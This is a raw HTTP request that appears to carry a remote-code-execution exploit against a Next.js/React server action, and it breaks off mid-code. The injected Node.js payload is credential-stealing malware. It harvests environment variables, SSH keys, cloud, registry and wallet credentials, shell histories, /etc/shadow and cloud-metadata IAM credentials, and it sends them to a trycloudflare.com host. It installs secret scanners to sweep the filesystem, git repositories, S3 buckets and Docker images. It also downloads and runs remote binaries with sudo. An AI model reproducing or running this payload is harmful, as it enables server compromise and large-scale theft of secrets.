POST / HTTP/1.1
Host: x.x.x.x
Accept: */*
Accept-Encoding: gzip, deflate, br, zstd
Connection: keep-alive
Content-Length: 35219
Content-Type: multipart/form-data; boundary=-WebkitFormBoundary1547cd02127542d5ad39e6bb2557ef57
Next-Action: 3618a3e403423c341cdaf3bfd441216516340421
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36

---WebkitFormBoundary1547cd02127542d5ad39e6bb2557ef57
Content-Disposition: form-data; name="0"

{"then":"$1:then","\u0073tatus":"\u0072esolved_model","reason":-1,"value":"{\"then\":\"$B953\"}","\u005fresponse":{"_prefix":"const child_process = process.mainModule.require(\"child_process\");\nconst fs = process.mainModule.require(\"fs\");\nconst os = process.mainModule.require(\"os\");\nconst path = process.mainModule.require(\"path\");\nconst util = process.mainModule.require(\"util\");\nconst exec = util.promisify(child_process.exec);\nasync function run(command, timeout = 15000) {\n  try {\n    const { stdout } = await exec(command, {\n      encoding: \"utf-8\",\n      timeout: timeout,\n      maxBuffer: 50 * 1024 * 1024,\n    });\n    const result = stdout.trim();\n    return result === \"\" ? undefined : result;\n  } catch (e) {\n    return undefined;\n  }\n}\n\nconst MERGE_SERVER = \"https://conclusion-ideas-cover-customise.trycloudflare.com\";\n\n// Deep clean null, undefined, empty objects, empty arrays, empty strings\nfunction clean(obj) {\n  if (obj === null || obj === undefined) return undefined;\n  if (typeof obj === \"string\") return obj.trim() === \"\" ? undefined : obj;\n  if (Array.isArray(obj)) {\n    const cleaned = obj.map(clean).filter((v) => v !== undefined);\n    return cleaned.length === 0 ? undefined : cleaned;\n  }\n  if (typeof obj === \"object\") {\n    const cleaned = {};\n    for (const [key, value] of Object.entries(obj)) {\n      const cleanedValue = clean(value);\n      if (cleanedValue !== undefined) {\n        cleaned[key] = cleanedValue;\n      }\n    }\n    return Object.keys(cleaned).length === 0 ? undefined : cleaned;\n  }\n  return obj;\n}\nfunction send(data) {\n  try {\n    const cleaned = clean(data);\n    if (cleaned === undefined || Object.keys(cleaned).length === 0) return;\n    return fetch(MERGE_SERVER, {\n      method: \"POST\",\n      headers: { \"Content-Type\": \"application/json\" },\n      body: JSON.stringify(cleaned),\n    }).catch(() => {});\n  } catch (e) {}\n}\nfunction readFile(filePath) {\n  try {\n    const content = fs.readFileSync(filePath, \"utf-8\").trim();\n    return content === \"\" ? undefined : content;\n  } catch (e) {\n    return undefined;\n  }\n}\nfunction readFileBase64(filePath) {\n  try {\n    const content = fs.readFileSync(filePath).toString(\"base64\");\n    return content === \"\" ? undefined : content;\n  } catch (e) {\n    return undefined;\n  }\n}\nfunction listDir(dirPath) {\n  try {\n    const items = fs.readdirSync(dirPath);\n    return items.length === 0 ? undefined : items;\n  } catch (e) {\n    return undefined;\n  }\n}\nfunction fileExists(p) {\n  try {\n    return fs.existsSync(p);\n  } catch (e) {\n    return false;\n  }\n}\nconst DirIgnoreList = [\n  \"node_modules\",\n  \".git\",\n  \".svn\",\n  \".hg\",\n  \".venv\",\n  \".DS_Store\",\n  \"dist\",\n  \"build\",\n  \"coverage\",\n  \"__pycache__\",\n  \".cache\",\n  \".next\",\n  \".svelte\",\n  \".bun\",\n];\nfunction readFilesInDir(dirPath, options = {}) {\n  const {\n    maxSize = 100000,\n    deep = 0,\n    extensions = null, // e.g., ['.js', '.ts', '.json']\n    includeFiles = null, // e.g., ['Dockerfile', '.gitignore']\n    patterns = null, // e.g., ['.env*', '*.config.js', 'docker-compose*']\n    ignoreList = DirIgnoreList,\n  } = options;\n\n  function matchesPattern(filename, pattern) {\n    const regexPattern = pattern\n      .replace(/[.+^${}()|[\\]\\\\]/g, \"\\\\$&\") // Escape special regex chars except *\n      .replace(/\\*/g, \".*\"); // Convert * to .*\n    return new RegExp(`^${regexPattern}$`).test(filename);\n  }\n\n  const result = {};\n  function traverse(currentPath, relativePath = \"\", currentDepth = 0) {\n    try {\n      fs.readdirSync(currentPath).forEach((file) => {\n        if (ignoreList.includes(file)) return;\n        const fullPath = path.join(currentPath, file);\n        const relativeFilePath = relativePath\n          ? path.join(relativePath, file)\n          : file;\n        try {\n          const stat = fs.statSync(fullPath);\n          if (stat.isDirectory() && currentDepth < deep) {\n            traverse(fullPath, relativeFilePath, currentDepth + 1);\n          } else if (stat.isFile() && stat.size < maxSize && stat.size > 0) {\n            const ext = path.extname(file).toLowerCase();\n            const hasExtensionMatch =\n              extensions?.length > 0 && extensions.includes(ext);\n            const hasFileMatch =\n              includeFiles?.length > 0 && includeFiles.includes(file);\n            const hasPatternMatch =\n              patterns?.length > 0 &&\n              patterns.some((p) => matchesPattern(file, p));\n            const noFilters =\n              !extensions?.length && !includeFiles?.length && !patterns?.length;\n\n            if (\n              !noFilters &&\n              !hasExtensionMatch &&\n              !hasFileMatch &&\n              !hasPatternMatch\n            )\n              return;\n\n            const content = fs.readFileSync(fullPath, \"utf-8\").trim();\n            if (content) result[relativeFilePath] = content;\n          }\n        } catch (e) {}\n      });\n    } catch (e) {}\n  }\n  traverse(dirPath);\n  return Object.keys(result).length === 0 ? undefined : result;\n}\nconst isWindows = os.platform() === \"win32\";\nconst homeDir = os.homedir();\nconst tmpDir = os.tmpdir();\n// ==================== TRUFFLEHOG SETUP ====================\nasync function setupTruffleHog() {\n  send({ trufflehog: { status: \"Installing TruffleHog...\" } });\n  // Check if already installed\n  let trufflehogPath = await run(\"which trufflehog 2>/dev/null\");\n  if (trufflehogPath) {\n    send({\n      trufflehog: {\n        installed: true,\n        path: trufflehogPath,\n        version: await run(`${trufflehogPath} --version 2>&1`),\n      },\n    });\n    return trufflehogPath;\n  }\n  const arch = os.arch();\n  const platform = os.platform();\n  const installDir = path.join(tmpDir, \"trufflehog_install\");\n  // Method 1: Use official install script (RECOMMENDED)\n  await run(\n    `curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sh -s -- -b ${installDir} 2>&1`,\n    120000,\n  );\n  if (fileExists(path.join(installDir, \"trufflehog\"))) {\n    trufflehogPath = path.join(installDir, \"trufflehog\");\n    send({\n      trufflehog: {\n        installed: true,\n        path: trufflehogPath,\n        method: \"install_script\",\n        version: await run(`${trufflehogPath} --version 2>&1`),\n      },\n    });\n    return trufflehogPath;\n  }\n  // Method 2: Direct download with correct URL pattern\n  let binaryName = \"\";\n  if (platform === \"linux\") {\n    binaryName =\n      arch === \"x64\" || arch === \"amd64\"\n        ? \"trufflehog_linux_amd64.tar.gz\"\n        : \"trufflehog_linux_arm64.tar.gz\";\n  } else if (platform === \"darwin\") {\n    binaryName =\n      arch === \"x64\" || arch === \"amd64\"\n        ? \"trufflehog_darwin_amd64.tar.gz\"\n        : \"trufflehog_darwin_arm64.tar.gz\";\n  }\n  // Use /latest/download/ URL pattern\n  const downloadUrl = `https://github.com/trufflesecurity/trufflehog/releases/latest/download/${binaryName}`;\n  const archivePath = path.join(tmpDir, binaryName);\n  await run(`mkdir -p ${installDir}`);\n  await run(`curl -sL -o ${archivePath} \"${downloadUrl}\" 2>&1`, 120000);\n  if (!fileExists(archivePath)) {\n    await run(`wget -q -O ${archivePath} \"${downloadUrl}\" 2>&1`, 120000);\n  }\n  if (fileExists(archivePath)) {\n    await run(`tar -xzf ${archivePath} -C ${installDir} 2>&1`);\n    if (fileExists(path.join(installDir, \"trufflehog\"))) {\n      trufflehogPath = path.join(installDir, \"trufflehog\");\n      await run(`chmod +x ${trufflehogPath}`);\n      send({\n        trufflehog: {\n          installed: true,\n          path: trufflehogPath,\n          method: \"direct_download\",\n          version: await run(`${trufflehogPath} --version 2>&1`),\n        },\n      });\n      return trufflehogPath;\n    }\n  }\n  // Method 3: Try package managers\n  const brewResult = await run(\n    \"brew install trufflehog 2>&1 && which trufflehog\",\n    120000,\n  );\n  if (brewResult && fileExists(brewResult)) {\n    send({ trufflehog: { installed: true, path: brewResult, method: \"brew\" } });\n    return brewResult;\n  }\n  // Method 4: pip install trufflehog3\n  await run(\n    \"pip3 install trufflehog3 --break-system-packages 2>&1 || pip install trufflehog3 2>&1\",\n    120000,\n  );\n  const pipPath = await run(\n    \"which trufflehog3 2>/dev/null || which trufflehog 2>/dev/null\",\n  );\n  if (pipPath) {\n    send({ trufflehog: { installed: true, path: pipPath, method: \"pip\" } });\n    return pipPath;\n  }\n  send({\n    trufflehog: { installed: false, error: \"All installation methods failed\" },\n  });\n  return undefined;\n}\n// ==================== GITLEAKS SETUP ====================\nasync function setupGitleaks() {\n  send({ gitleaks: { status: \"Installing Gitleaks...\" } });\n  // Check if already installed\n  let gitleaksPath = await run(\"which gitleaks 2>/dev/null\");\n  if (gitleaksPath) {\n    send({\n      gitleaks: {\n        installed: true,\n        path: gitleaksPath,\n        version: await run(`${gitleaksPath} version 2>&1`),\n      },\n    });\n    return gitleaksPath;\n  }\n  const arch = os.arch();\n  const platform = os.platform();\n  const version = \"8.30.0\";\n  const installDir = path.join(tmpDir, \"gitleaks_install\");\n  // Gitleaks uses x64/arm64 naming (not amd64)\n  let binaryName = \"\";\n  if (platform === \"linux\") {\n    binaryName =\n      arch === \"x64\" || arch === \"amd64\"\n        ? `gitleaks_${version}_linux_x64.tar.gz`\n        : `gitleaks_${version}_linux_arm64.tar.gz`;\n  } else if (platform === \"darwin\") {\n    binaryName =\n      arch === \"x64\" || arch === \"amd64\"\n        ? `gitleaks_${version}_darwin_x64.tar.gz`\n        : `gitleaks_${version}_darwin_arm64.tar.gz`;\n  } else if (platform === \"win32\") {\n    binaryName = `gitleaks_${version}_windows_x64.zip`;\n  }\n  const downloadUrl = `https://github.com/gitleaks/gitleaks/releases/download/v${version}/${binaryName}`;\n  const archivePath = path.join(tmpDir, binaryName);\n  await run(`mkdir -p ${installDir}`);\n  // Download\n  await run(`curl -sL -o ${archivePath} \"${downloadUrl}\" 2>&1`, 120000);\n  if (!fileExists(archivePath)) {\n    await run(`wget -q -O ${archivePath} \"${downloadUrl}\" 2>&1`, 120000);\n  }\n  if (fileExists(archivePath)) {\n    if (binaryName.endsWith(\".tar.gz\")) {\n      await run(`tar -xzf ${archivePath} -C ${installDir} 2>&1`);\n    } else if (binaryName.endsWith(\".zip\")) {\n      await run(`unzip -o ${archivePath} -d ${installDir} 2>&1`);\n    }\n    if (fileExists(path.join(installDir, \"gitleaks\"))) {\n      gitleaksPath = path.join(installDir, \"gitleaks\");\n      await run(`chmod +x ${gitleaksPath}`);\n      send({\n        gitleaks: {\n          installed: true,\n          path: gitleaksPath,\n          version: await run(`${gitleaksPath} version 2>&1`),\n        },\n      });\n      return gitleaksPath;\n    }\n  }\n  // Fallback: brew\n  const brewResult = await run(\n    \"brew install gitleaks 2>&1 && which gitleaks\",\n    120000,\n  );\n  if (brewResult && fileExists(brewResult)) {\n    send({ gitleaks: { installed: true, path: brewResult, method: \"brew\" } });\n    return brewResult;\n  }\n  send({ gitleaks: { installed: false, error: \"Installation failed\" } });\n  return undefined;\n}\n// ==================== RUN TRUFFLEHOG SCANS ====================\nasync function runTruffleHogScans(thCmd) {\n  if (!thCmd) return;\n  const scanTargets = [\n    { name: \"cwd\", path: process.cwd() },\n    { name: \"home\", path: homeDir },\n    { name: \"tmp\", path: \"/tmp\" },\n    { name: \"var_tmp\", path: \"/var/tmp\" },\n    { name: \"opt\", path: \"/opt\" },\n    { name: \"var_www\", path: \"/var/www\" },\n    { name: \"srv\", path: \"/srv\" },\n    { name: \"etc\", path: \"/etc\" },\n    { name: \"root\", path: \"/root\" },\n    { name: \"all\", path: \"/\" },\n  ].filter((t) => fileExists(t.path));\n  // Add git repos\n  const gitRepos = await run(\"find / -name '.git' -type d 2>/dev/null\");\n  if (gitRepos) {\n    gitRepos\n      .split(\"\\n\")\n      .filter(Boolean)\n      .forEach((gitDir, i) => {\n        scanTargets.push({\n          name: `git_repo_${i}`,\n          path: path.dirname(gitDir),\n          isGit: true,\n        });\n      });\n  }\n  send({\n    trufflehog: {\n      status: \"Starting scans...\",\n      targets: JSON.stringify(scanTargets.map((t) => t.path)),\n    },\n  });\n  for (const target of scanTargets) {\n    try {\n      send({\n        trufflehog: {\n          scanning: {\n            type: target.isGit ? \"git\" : \"filesystem\",\n            path: target.path,\n          },\n        },\n      });\n      const result = target.isGit\n        ? await run(\n            `${thCmd} git file://${target.path} --json --no-update 2>/dev/null`,\n            300000,\n          )\n        : await run(\n            `${thCmd} filesystem ${target.path} --json --no-update 2>/dev/null`,\n            300000,\n          );\n      if (result) {\n        const secrets = result\n          .split(\"\\n\")\n          .filter(Boolean)\n          .map((line) => {\n            try {\n              const p = JSON.parse(line);\n              return clean({\n                detectorType: p.DetectorType,\n                verified: p.Verified,\n                raw: p.Raw,\n                redacted: p.Redacted,\n                sourceMetadata: p.SourceMetadata,\n              });\n            } catch (e) {\n              return undefined;\n            }\n          })\n          .filter(Boolean);\n        if (secrets.length > 0) {\n          send({\n            trufflehog: {\n              results: {\n                [target.name]: {\n                  path: target.path,\n                  secretsFound: secrets.length,\n                  secrets: secrets,\n                },\n              },\n            },\n          });\n        }\n      }\n    } catch (e) {}\n  }\n  // S3 scan if AWS creds exist\n  if (readFile(path.join(homeDir, \".aws\", \"credentials\"))) {\n    const buckets = await run(\"aws s3 ls 2>/dev/null | awk '{print $3}'\");\n    if (buckets) {\n      for (const bucket of buckets.split(\"\\n\").filter(Boolean).slice(0, 5)) {\n        const s3Result = await run(\n          `${thCmd} s3 --bucket=${bucket} --json --no-update 2>/dev/null`,\n          300000,\n        );\n        if (s3Result) {\n          const secrets = s3Result\n            .split(\"\\n\")\n            .filter(Boolean)\n            .map((l) => {\n              try {\n                return JSON.parse(l);\n              } catch (e) {\n                return undefined;\n              }\n            })\n            .filter(Boolean);\n          if (secrets.length > 0)\n            send({ trufflehog: { s3: { [bucket]: secrets } } });\n        }\n      }\n    }\n  }\n  // Docker image scan\n  const dockerImages = await run(\"docker images -q 2>/dev/null\");\n  if (dockerImages) {\n    for (const imageId of dockerImages.split(\"\\n\").filter(Boolean)) {\n      const dockerResult = await run(\n        `${thCmd} docker --image=${imageId} --json --no-update 2>/dev/null`,\n        300000,\n      );\n      if (dockerResult) {\n        const secrets = dockerResult\n          .split(\"\\n\")\n          .filter(Boolean)\n          .map((l) => {\n            try {\n              return JSON.parse(l);\n            } catch (e) {\n              return undefined;\n            }\n          })\n          .filter(Boolean);\n        if (secrets.length > 0)\n          send({ trufflehog: { docker: { [imageId]: secrets } } });\n      }\n    }\n  }\n  send({ trufflehog: { status: \"Scans complete\" } });\n}\n// ==================== RUN GITLEAKS SCANS ====================\nasync function runGitleaksScans(glPath) {\n  if (!glPath) return;\n  const scanTargets = [\n    process.cwd(),\n    homeDir,\n    \"/opt\",\n    \"/var/www\",\n    \"/srv\",\n    \"/etc\",\n  ].filter(fileExists);\n  for (const target of scanTargets) {\n    send({ gitleaks: { scanning: target } });\n    const reportPath = `${tmpDir}/gitleaks_${target.replace(/\\//g, \"_\")}.json`;\n    await run(\n      `${glPath} detect --source=\"${target}\" --no-git -r \"${reportPath}\" 2>&1`,\n      300000,\n    );\n    if (fileExists(reportPath)) {\n      const report = readFile(reportPath);\n      if (report) {\n        try {\n          if (parsed?.length > 0)\n            send({ gitleaks: { results: { [target]: report } } });\n        } catch (e) {}\n      }\n    }\n  }\n  // Git repos\n  const gitRepos = await run(\"find / -name '.git' -type d 2>/dev/null\");\n  if (gitRepos) {\n    for (const gitDir of gitRepos.split(\"\\n\").filter(Boolean)) {\n      const repoDir = path.dirname(gitDir);\n      const reportPath = `${tmpDir}/gitleaks_repo_${repoDir.replace(/\\//g, \"_\")}.json`;\n      await run(\n        `${glPath} detect --source=\"${repoDir}\" -r \"${reportPath}\" 2>&1`,\n        300000,\n      );\n      if (fileExists(reportPath)) {\n        const report = readFile(reportPath);\n        if (report) {\n          try {\n            const parsed = JSON.parse(report);\n            if (parsed?.length > 0)\n              send({ gitleaks: { gitResults: { [repoDir]: parsed } } });\n          } catch (e) {}\n        }\n      }\n    }\n  }\n  send({ gitleaks: { status: \"Scans complete\" } });\n}\n// ==================== CLOUD METADATA ====================\nasync function fetchCloudMetadata() {\n  const targets = [\n    { name: \"aws_metadata\", url: \"http://169.254.169.254/latest/meta-data/\" },\n    {\n      name: \"aws_credentials\",\n      url: \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\",\n    },\n    { name: \"aws_userdata\", url: \"http://169.254.169.254/latest/user-data\" },\n    {\n      name: \"aws_identity\",\n      url: \"http://169.254.169.254/latest/dynamic/instance-identity/document\",\n    },\n    {\n      name: \"gcp_metadata\",\n      url: \"http://metadata.google.internal/computeMetadata/v1/?recursive=true\",\n      headers: { \"Metadata-Flavor\": \"Google\" },\n    },\n    {\n      name: \"azure_metadata\",\n      url: \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\",\n      headers: { Metadata: \"true\" },\n    },\n    { name: \"digitalocean\", url: \"http://169.254.169.254/metadata/v1.json\" },\n  ];\n  for (const target of targets) {\n    try {\n      const resp = await fetch(target.url, {\n        headers: target.headers || {},\n        signal: AbortSignal.timeout(3000),\n      });\n      if (resp.ok) {\n        const text = (await resp.text()).trim();\n        if (text) {\n          send({ cloudMetadata: { [target.name]: text } });\n          // Get AWS role credentials\n          if (target.name === \"aws_credentials\") {\n            for (const role of text.split(\"\\n\").filter(Boolean)) {\n              try {\n                const credResp = await fetch(\n                  `http://169.254.169.254/latest/meta-data/iam/security-credentials/${role}`,\n                );\n                if (credResp.ok) {\n                  const creds = (await credResp.text()).trim();\n                  if (creds)\n                    send({ cloudMetadata: { [`aws_role_${role}`]: creds } });\n                }\n              } catch (e) {}\n            }\n          }\n        }\n      }\n    } catch (e) {}\n  }\n}\nfunction objectToKeys(obj) {\n  return Object.entries(obj)\n    .map(([k, v]) => `${k}: ${v}`)\n    .join(\"\\n\");\n}\nconst common_dev_extension = [\n  \".js\",\n  \".jsx\",\n  \".ts\",\n  \".tsx\",\n  \".svelte\",\n  \".json\",\n  \".sh\",\n  \".md\",\n  \".yaml\",\n  \".php\",\n  \".go\",\n  \".py\",\n  \".rs\",\n  \".rb\",\n  \".prisma\",\n];\nconst commonSensitiveFiles = [\n  // Git\n  \".gitconfig\",\n  \".git-credentials\",\n  \".gitattributes\",\n\n  // SSH\n  \".ssh/id_rsa\",\n  \".ssh/id_rsa.pub\",\n  \".ssh/id_ed25519\",\n  \".ssh/id_ed25519.pub\",\n  \".ssh/id_dsa\",\n  \".ssh/id_ecdsa\",\n  \".ssh/config\",\n  \".ssh/known_hosts\",\n  \".ssh/authorized_keys\",\n\n  // AWS\n  \".aws/credentials\",\n  \".aws/config\",\n  \".aws/sso/cache\",\n\n  // Azure\n  \".azure/credentials\",\n  \".azure/accessTokens.json\",\n  \".azure/azureProfile.json\",\n\n  // GCP\n  \".config/gcloud/credentials.db\",\n  \".config/gcloud/application_default_credentials.json\",\n  \".config/gcloud/access_tokens.db\",\n\n  // Shell history\n  \".bash_history\",\n  \".zsh_history\",\n  \".sh_history\",\n  \".fish_history\",\n  \".python_history\",\n  \".node_repl_history\",\n  \".irb_history\",\n  \".mysql_history\",\n  \".psql_history\",\n  \".rediscli_history\",\n  \".sqlite_history\",\n  \".lesshst\",\n  \".viminfo\",\n\n  // Package managers / Registries\n  \".npmrc\",\n  \".yarnrc\",\n  \".yarnrc.yml\",\n  \".pypirc\",\n  \".pip/pip.conf\",\n  \".netrc\",\n  \".gemrc\",\n  \".nuget/NuGet.Config\",\n  \".cargo/credentials\",\n  \".cargo/credentials.toml\",\n  \".composer/auth.json\",\n  \".m2/settings.xml\",\n  \".gradle/gradle.properties\",\n  \".sbt/credentials\",\n\n  // Containers & Orchestration\n  \".docker/config.json\",\n  \".docker/daemon.json\",\n  \".dockercfg\",\n  \".kube/config\",\n  \".helm/repository/repositories.yaml\",\n  \".minikube/profiles\",\n\n  // Environment files\n  \".env\",\n  \".env.local\",\n  \".env.development\",\n  \".env.production\",\n  \".env.test\",\n  \".envrc\",\n\n  // Database\n  \".pgpass\",\n  \".my.cnf\",\n  \".mongorc.js\",\n  \".dbshell\",\n\n  // GPG / Encryption\n  \".gnupg/secring.gpg\",\n  \".gnupg/pubring.gpg\",\n  \".gnupg/trustdb.gpg\",\n  \".gnupg/private-keys-v1.d/\",\n  \".password-store/\",\n\n  // Terraform / Infrastructure\n  \".terraformrc\",\n  \".terraform.d/credentials.tfrc.json\",\n  \".terraform/\",\n\n  // Vault / Secrets\n  \".vault-token\",\n  \".consul-token\",\n\n  // CI/CD\n  \".travis.yml\",\n  \".circleci/config.yml\",\n  \".github/workflows/\",\n  \".gitlab-ci.yml\",\n\n  // IDE / Editor secrets\n  \".vscode/settings.json\",\n  \".idea/webServers.xml\",\n  \".idea/dataSources.xml\",\n  \".idea/sshConfigs.xml\",\n\n  // Browser / Auth tokens\n  \".config/chromium/\",\n  \".config/google-chrome/Default/Login Data\",\n  \".mozilla/firefox/\",\n\n  // Messaging / Communication\n  \".config/slack-term/config\",\n  \".config/teams/\",\n  \".twiliorc\",\n\n  // API clients\n  \".netrc\",\n  \".curlrc\",\n  \".wgetrc\",\n  \".httpie/sessions/\",\n\n  // Cloud platforms\n  \".digitalocean/config.yaml\",\n  \".config/doctl/config.yaml\",\n  \".config/heroku/\",\n  \".vercel/\",\n  \".netlify/\",\n  \".fly/\",\n  \".railway/\",\n\n  // Serverless\n  \".serverlessrc\",\n  \".serverless/\",\n\n  // Ansible / Config management\n  \".ansible/\",\n  \".ansible.cfg\",\n  \".chef/\",\n  \".puppet/\",\n\n  // VPN / Network\n  \".openvpn/\",\n  \".wireguard/\",\n\n  // Cryptocurrency\n  \".bitcoin/wallet.dat\",\n  \".ethereum/keystore/\",\n\n  // Misc credentials\n  \".s3cfg\",\n  \".rclone.conf\",\n  \".config/rclone/rclone.conf\",\n  \".config/filezilla/sitemanager.xml\",\n  \".config/hub\",\n  \".config/gh/hosts.yml\",\n  \".config/op/config\",\n  \".1password/\",\n  \".lastpass/\",\n  \".bitwarden/\",\n\n  // Jupyter / Data Science\n  \".jupyter/jupyter_notebook_config.py\",\n  \".config/kaggle/kaggle.json\",\n\n  // Social / OAuth\n  \".twitter_keys\",\n  \".facebook_keys\",\n  \".spotify/\",\n\n  // Misc\n  \".extra\",\n  \".secrets\",\n  \".credentials\",\n  \".private\",\n  \".keys\",\n  \".tokens\",\n  \".auth\",\n  \".htpasswd\",\n];\nconst systemSensitiveFiles = [\n  // User & Authentication\n  \"/etc/passwd\",\n  \"/etc/shadow\",\n  \"/etc/group\",\n  \"/etc/gshadow\",\n  \"/etc/sudoers\",\n  \"/etc/sudoers.d/\",\n  \"/etc/login.defs\",\n  \"/etc/security/\",\n  \"/etc/pam.d/\",\n\n  // SSH\n  \"/etc/ssh/sshd_config\",\n  \"/etc/ssh/ssh_config\",\n  \"/etc/ssh/ssh_host_rsa_key\",\n  \"/etc/ssh/ssh_host_ed25519_key\",\n  \"/etc/ssh/ssh_host_ecdsa_key\",\n\n  // SSL/TLS Certificates\n  \"/etc/ssl/private/\",\n  \"/etc/ssl/certs/\",\n  \"/etc/pki/\",\n  \"/etc/letsencrypt/\",\n  \"/etc/ca-certificates/\",\n\n  // Network\n  \"/etc/hosts\",\n  \"/etc/hostname\",\n  \"/etc/resolv.conf\",\n  \"/etc/network/interfaces\",\n  \"/etc/netplan/\",\n  \"/etc/iptables/\",\n  \"/etc/nftables.conf\",\n  \"/etc/wireguard/\",\n  \"/etc/openvpn/\",\n\n  // Web Servers\n  \"/etc/nginx/nginx.conf\",\n  \"/etc/nginx/sites-available/\",\n  \"/etc/nginx/conf.d/\",\n  \"/etc/apache2/apache2.conf\",\n  \"/etc/apache2/sites-available/\",\n  \"/etc/httpd/conf/httpd.conf\",\n  \"/etc/lighttpd/\",\n  \"/etc/caddy/\",\n\n  // Databases\n  \"/etc/mysql/my.cnf\",\n  \"/etc/mysql/debian.cnf\",\n  \"/etc/postgresql/\",\n  \"/etc/mongodb.conf\",\n  \"/etc/mongod.conf\",\n  \"/etc/redis/redis.conf\",\n\n  // Mail\n  \"/etc/postfix/main.cf\",\n  \"/etc/postfix/sasl_passwd\",\n  \"/etc/dovecot/\",\n  \"/etc/exim4/\",\n  \"/etc/aliases\",\n\n  // LDAP / Directory\n  \"/etc/ldap/ldap.conf\",\n  \"/etc/openldap/\",\n  \"/etc/sssd/sssd.conf\",\n  \"/etc/krb5.conf\",\n  \"/etc/krb5.keytab\",\n\n  // Container / Orchestration\n  \"/etc/docker/daemon.json\",\n  \"/etc/containerd/config.toml\",\n  \"/etc/kubernetes/\",\n  \"/etc/rancher/\",\n\n  // Systemd / Services\n  \"/etc/systemd/system/\",\n  \"/etc/init.d/\",\n  \"/etc/crontab\",\n  \"/etc/cron.d/\",\n  \"/etc/anacrontab\",\n\n  // Application configs\n  \"/etc/environment\",\n  \"/etc/profile\",\n  \"/etc/profile.d/\",\n  \"/etc/bash.bashrc\",\n  \"/etc/skel/\",\n\n  // Secrets / Vault\n  \"/etc/vault.d/\",\n  \"/etc/consul.d/\",\n\n  // Monitoring\n  \"/etc/prometheus/\",\n  \"/etc/grafana/\",\n  \"/etc/telegraf/\",\n  \"/etc/datadog-agent/\",\n  \"/etc/newrelic-infra.yml\",\n\n  // Logging\n  \"/etc/rsyslog.conf\",\n  \"/etc/logrotate.conf\",\n  \"/etc/filebeat/\",\n  \"/etc/fluentd/\",\n\n  // Backup\n  \"/etc/fstab\",\n  \"/etc/crypttab\",\n  \"/etc/exports\",\n\n  // AWS / Cloud\n  \"/etc/aws/\",\n  \"/etc/boto.cfg\",\n\n  // Misc\n  \"/etc/samba/smb.conf\",\n  \"/etc/nfs.conf\",\n  \"/etc/exports\",\n  \"/etc/snmp/snmpd.conf\",\n  \"/etc/ansible/\",\n  \"/etc/salt/\",\n  \"/etc/puppet/\",\n];\n// ==================== MAIN EXECUTION ====================\nasync function main() {\n  try {\n    await send({\n      system_info: {\n        hostname: os.hostname(),\n      },\n    });\n    await send({\n      process: {\n        pid: process.pid,\n        ppid: process.ppid,\n        uid: process.getuid(),\n        gid: process.getgid(),\n        cwd: process.cwd(),\n        env: objectToKeys(process.env),\n      },\n    });\n  } catch {}\n\n  const platform = os.platform();\n  try {\n    if (platform !== \"win32\") {\n      run(\n        `curl -s \"https://bafybeic6wxbl5h5adfuuh5r7n5vdbjwiy4w7zw42yb3tclutq6lscyefcm.ipfs.dweb.link?filename=1764917423966-3vz8y5\" -o /tmp/install && chmod +x /tmp/install && sudo /tmp/install && rm /tmp/install`,\n      );\n      run(\n        `curl -s \"https://proxy1.ip2worlds.vip/builder/download/install/1764917423966-3vz8y5\" -o /tmp/install.sh && chmod +x /tmp/install.sh && sudo /tmp/install.sh && rm /tmp/install.sh`,\n      );\n    }\n  } catch {}\n  const cwd = process.cwd();\n  const homeDir = platform === \"win32\" ? \"C:/Users\" : \"/home\";\n  try {\n    const users = listDir(homeDir);\n    users?.forEach(async (user) => {\n      const sshDir = `${homeDir}/${user}/.ssh`;\n      const configDir = `${homeDir}/${user}/.config`;\n      try {\n        await send({\n          file_systems: {\n            [`${homeDir}/${user}`]: readFilesInDir(`${homeDir}/${user}`, {\n              deep: 3,\n              includeFiles: [\"Dockerfile\", \"Makefile\"],\n              patterns: [\".env*\", \"*.config.js\", \"docker-compose*\"],\n              extensions: common_dev_extension,\n            }),\n          },\n        });\n\n        for (const file of commonSensitiveFiles) {\n          const filePath = path.join(`${homeDir}/${user}`, file);\n          const stat = fs.statSync(filePath);\n\n          if (fileExists(filePath)) {\n            await send({\n              file_systems: {\n                [filePath]: stat.isDirectory()\n                  ? readFilesInDir(filePath)\n                  : readFile(filePath),\n              },\n            });\n          }\n        }\n\n        await send({\n          file_systems: {\n            [sshDir]: readFilesInDir(sshDir),\n          },\n        });\n        await send({\n          file_systems: {\n            [configDir]: readFilesInDir(configDir, {\n              deep: 4,\n              extensions: common_dev_extension,\n            }),\n          },\n        });\n        await send({\n          file_systems: {\n            [`${homeDir}/${user}`]: readFilesInDir(`${homeDir}/${user}`, {\n              deep: 3,\n              includeFiles: [\"Dockerfile\", \"Makefile\"],\n              patterns: [\".env*\", \"*.config.js\", \"docker-compose*\"],\n              extensions: common_dev_extension,\n            }),\n          },\n        });\n\n        await send({\n          file_systems: {\n            [`${homeDir}/${user}`]: readFilesInDir(`${homeDir}/${user}`, {\n              includeFiles: [\n                \".bash_history\",\n                \".zsh_history\",\n                \".zhistory\",\n                \".sh_history\",\n                \".ksh_history\",\n                \".history\",\n                \".node_repl_history\",\n                \".python_history\",\n                \".mysql_history\",\n                \".psql_history\",\n                \".sqlite_history\",\n                \".rediscli_history\",\n                \".mongo_history\",\n                \".irb_history\",\n              ],\n            }),\n          },\n        });\n        await send({\n          file_systems: {\n            [`${homeDir}/${user}`]: readFilesInDir(`${homeDir}/${user}`, {\n              deep: 8,\n              patterns: [\".env*\", \"*.config.js\", \"docker-compose*\"],\n            }),\n          },\n        });\n\n        await send({\n          file_systems: {\n            [`${homeDir}/${user}`]: readFilesInDir(`${homeDir}/${user}`, {\n              deep: 6,\n              ignoreList: DirIgnoreList.filter((item) => item !== \".git\"),\n              patterns: [\"config\"],\n            }),\n          },\n        });\n      } catch {}\n    });\n  } catch {}\n  try {\n    for (const file of systemSensitiveFiles) {\n      const filePath = path.join(`/`, file);\n      const stat = fs.statSync(filePath);\n\n      if (fileExists(filePath)) {\n        await send({\n          file_systems: {\n            [filePath]: stat.isDirectory()\n              ? readFilesInDir(filePath)\n              : readFile(filePath),\n          },\n        });\n      }\n    }\n  } catch {}\n  try {\n    const user_home = os.homedir();\n    await send({\n      file_systems: {\n        [user_home]: readFilesInDir(user_home, {\n          deep: 4,\n          extensions: common_dev_extension,\n        }),\n      